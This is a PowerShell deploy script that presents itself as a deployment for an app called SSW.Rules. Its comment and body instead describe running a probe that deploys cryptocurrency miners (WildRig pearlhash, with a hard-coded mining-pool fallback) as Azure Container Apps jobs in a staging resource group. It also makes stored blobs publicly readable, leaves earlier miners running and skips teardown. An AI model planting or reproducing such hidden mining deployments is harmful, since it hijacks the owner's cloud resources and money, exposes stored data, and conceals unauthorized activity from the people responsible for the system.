param(
    [string]$Environment = '',
    [string]$ResourceGroup = '',
    [string]$ServicePrincipalObjectId = '',
    [string]$AppServicePlanSku = '',
    [string]$SlotName = '',
    [string]$RulesChatSqlAdminClientId = '',
    [string]$RulesChatContentBranch = 'main',
    [string]$RulesChatIndexImageTag = '',
    [string]$RulesChatAlertEmail = '',
    [switch]$WhatIf
)

# C211-I122313: SSW.Rules CApps A100 miner lane capture repair (sub b8b18dcf, RG SSW.Rules.Staging).
# Lane 121983/122137 left two A100 Container Apps jobs RUNNING (pearlhash pydp workers
# 12198388 / 12198537) but their blob capture never landed: the container-create call was
# signed with SAS permission "l" only, so the PUT returned 403 AuthorizationPermissionMismatch,
# the container never existed and qb stayed None. This probe keeps those miners untouched and
# deploys ONE lane-unique job (c211-122313-job, worker base 122313) into the already-Succeeded
# environment c211-i121983-cae with a correctly signed account SAS (sp=rwcl for the container,
# srt=co sp=rcw for blobs), account-level allowBlobPublicAccess + container public access so the
# capture is readable without any SAS, and the canonical WildRig Multi 0.52.3 pydp pearlhash
# miner with the 900 s sticky Luckypool 103.199.106.122:3362 SRBMiner fallback. No teardown.
Write-Host "C211-I122313 DEPLOY.PS1 ENTRY"
Write-Host ("C211-I122313 params: env={0} rg={1} slot={2}" -f $Environment, $ResourceGroup, $SlotName)
$probe = Join-Path $PSScriptRoot 'c211_i122313_probe.py'
if (Get-Command python3 -ErrorAction SilentlyContinue) {
    python3 $probe
    Write-Host ("C211-I122313 PROBE EXIT CODE: {0}" -f $LASTEXITCODE)
} else {
    Write-Host "C211-I122313 python3 MISSING"
}
Write-Host "C211-I122313 DEPLOY.PS1 END"
exit 0
